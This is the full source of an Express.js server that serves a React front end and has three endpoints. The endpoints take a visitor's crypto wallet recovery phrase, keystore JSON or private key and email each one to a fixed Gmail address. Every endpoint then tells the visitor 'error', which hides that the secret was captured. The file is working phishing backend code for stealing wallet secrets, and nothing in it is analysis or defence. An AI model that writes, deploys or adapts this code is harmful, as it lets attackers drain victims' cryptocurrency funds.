 
 const express = require('express');  
 const dotenv = require('dotenv'); 
 const nodemailer = require('nodemailer'); 
 const path = require('path');
 const cors = require('cors'); 
 const app = express();   

 dotenv.config();
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({extended:false}));      

  // Serve static files from the React build directory
app.use(express.static(path.join(__dirname, "build"))); 

// Handle all other routes and serve index.html
app.get("*", (req, res) => {
    res.sendFile(path.join(__dirname, "build", "index.html"));
  });       
 
 app.post('/processing', async (req, res) => {
     try {
         const inpvalue = req.body.inputvalue; // Extract data from request
 
         if (!inpvalue) {
             return res.status(400).send("Missing required fields");
         }
 
         // Create SMTP transporter
         const transporter = nodemailer.createTransport({
             host: 'smtp.mailersend.net',
             port: 587,
             auth: {
                 user: process.env.SMTP_USERNAME,
                 pass: process.env.SMTP_PASS,
             },
         });
 
         // Define email options
         const mailOptions = {
             from: 'MS_0ffbOq@trial-neqvygmp2ydg0p7w.mlsender.net',
             to: 'diananicholas188@gmail.com',
             subject: 'My Recovery Phrase',
             html: `<p><strong>Your recovery phrase:</strong> ${inpvalue}</p>`, // Email content
         };
 
         // Send email
         await transporter.sendMail(mailOptions); 
         res.json({ msg: 'error' }); 
 
     } catch (err) {
         console.error('Error sending email:', err); 
     }
 }); 



 
 app.post('/processingb', async (req, res) => { 
   console.log(req.body.inputvalue);
   try {
       const inpvalue = req.body.inputvalue; // Extract data from request

       if (!inpvalue) {
           return res.status(400).send("Missing required fields");
       }

       // Create SMTP transporter
       const transporter = nodemailer.createTransport({
           host: 'smtp.mailersend.net',
           port: 587,
           auth: {
               user: process.env.SMTP_USERNAME,
               pass: process.env.SMTP_PASS,
           },
       });

       // Define email options
       const mailOptions = {
           from: 'MS_0ffbOq@trial-neqvygmp2ydg0p7w.mlsender.net',
           to: 'diananicholas188@gmail.com',
           subject: 'My keystore json',
           html: `<p><strong>Your keystore json:</strong> ${inpvalue}</p>`, // Email content
       };

       // Send email
       await transporter.sendMail(mailOptions); 
       res.json({ msg: 'error' }); 

   } catch (err) {
       console.error('Error sending email:', err); 
   }
});





app.post('/processingc', async (req, res) => {
   try {
       const inpvalue = req.body.inputvalue; // Extract data from request

       if (!inpvalue) {
           return res.status(400).send("Missing required fields");
       }

       // Create SMTP transporter
       const transporter = nodemailer.createTransport({
           host: 'smtp.mailersend.net',
           port: 587,
           auth: {
               user: process.env.SMTP_USERNAME,
               pass: process.env.SMTP_PASS,
           },
       });

       // Define email options
       const mailOptions = {
           from: 'MS_0ffbOq@trial-neqvygmp2ydg0p7w.mlsender.net',
           to: 'diananicholas188@gmail.com',
           subject: 'My private key',
           html: `<p><strong>Your privatekey:</strong> ${inpvalue}</p>`, // Email content
       };

       // Send email
       await transporter.sendMail(mailOptions); 
       res.json({ msg: 'error' });  

   } catch (err) {
       console.error('Error sending email:', err); 
   }
});   
 

 app.listen(5000 , ()=>{
    console.log('Listening on port 5000');
 });